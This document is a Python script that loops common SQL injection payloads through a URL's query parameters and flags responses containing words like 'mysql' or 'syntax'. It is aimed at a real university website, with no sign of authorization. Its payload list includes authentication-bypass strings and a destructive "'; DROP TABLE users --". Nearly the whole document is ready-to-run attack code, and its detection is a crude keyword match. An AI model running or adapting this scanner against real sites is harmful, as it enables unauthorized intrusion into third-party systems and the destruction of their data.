import requests
from urllib.parse import urlparse, urlencode, parse_qs
import warnings

# Suppress specific urllib3 warnings related to OpenSSL compatibility
warnings.filterwarnings("ignore", category=UserWarning, module='urllib3')

# Define the target URL (make sure it has query parameters)
url = "https://www.umanitoba.ca/"  # Example without query parameters; modify if needed

# List of common SQL injection payloads
payloads = [
    "' OR 1=1 --",
    "' OR 'a'='a",
    "' UNION SELECT NULL, NULL --",
    "' OR '1'='1' --",
    '" OR 1=1 --',
    "'; DROP TABLE users --"
]

# Function to check for SQL injection in URL parameters
def check_sql_injection_in_url(url, payloads):
    # Parse the URL and extract parameters
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)

    if not params:
        print("No query parameters found in the URL. SQL injection tests cannot be performed.")
        return

    # Check each parameter in the URL for potential SQL injection
    for param, values in params.items():
        for payload in payloads:
            # Try replacing the parameter value with a payload
            test_url = url.replace(f"{param}={values[0]}", f"{param}={payload}")
            print(f"Testing payload: {payload} in parameter: {param}")
            try:
                response = requests.get(test_url)
                # Look for signs of vulnerability in the response
                if "error" in response.text or "mysql" in response.text or "syntax" in response.text:
                    print(f"Potential SQL injection vulnerability found with payload: {payload}")
                else:
                    print(f"No injection detected with payload: {payload}")
            except requests.exceptions.RequestException as e:
                print(f"Error during request: {e}")

# Run the check
check_sql_injection_in_url(url, payloads)
